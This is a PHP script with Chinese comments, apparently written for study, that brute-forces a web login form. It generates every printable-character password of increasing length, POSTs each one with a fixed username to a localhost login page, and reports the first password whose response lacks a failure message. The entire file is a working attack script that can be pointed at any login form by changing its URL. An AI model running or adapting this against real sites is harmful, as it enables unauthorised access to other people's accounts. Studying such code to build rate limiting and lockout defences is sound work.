<?php

//暴力破解攻击
//该脚本依次生成常用字符串组成的密码,这些字符可用键盘输入。它以长度为1的密码作为开始,但也可简单修改变量$length的初始值,以较长的长度作为开始。一旦脚本生成所有可能的给定长度的密码,它将增加长度并用一个新的长度重新开始密码生成过程。通过使用PHP流,该脚本对表单使用的URL执行POST请求,并包含了它提交的用户名和表单数据中生成的密码。随后脚本检查响应主体中表示登录失败的子字符串。如果没有找到这个字符串,脚本便假定这个密码是正确的,然后输出密码并终止脚步

set_time_limit(0);
$url='http://localhost/study/php/login/login.php';
$post_data=array('username'=>'张三');
$length=3;
$password=array();
$chr=array_combine(range(32,126), array_map('chr',range(32,126)));
$ord=array_flip($chr);   //反转数组的键名和键值,数字为键值
$first=reset($chr);      //将数组内部指针复位,指向第一个元素
$last=end($chr);         //指向最后一个元素
$count = 0;              //统计尝试的次数

while(true){
	$length++;
	$end=$length-1;
	$password=array_fill(0,$length,$first);  //下标0开始,有$length个值为$first的元素的数组
	$stop=array_fill(0,$length,$last);

	//创建并返回一个文本数据流并应用各种选项,可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程
	while($password!=$stop){
		foreach($chr as $string){
			$password[$end]=$string;
			$post_data['password']=implode('',$password);
			echo $count++ . " - " . $post_data['password'].PHP_EOL;
			$context=stream_context_create(array(        //创建资源流上下文
				'http'=>array(
					'method'=>'POST',
					'follow_location'=>false,
					'header'=>'Content-Type: application/x-www-form-urlencoded',
					'content'=>http_build_query($post_data)
				)
			));

			$response=file_get_contents($url,false,$context);
			if(strpos($response,'POSTInvaliable visit!') === false){
				echo 'Password found: '.$post_data['password'], PHP_EOL;
				exit;
			}
		}

		for($left=$end-1;isset($password[$left])&&$password[$left]==$last;$left--);

		if(isset($password[$left]) && $password[$left] != $last){
			$password[$left] = $chr[$ord[$password[$left]]+1];
			for($index = $left+1; $index <= $length; $index++){
				$password[$index] = $first;
			}
		}
	}
}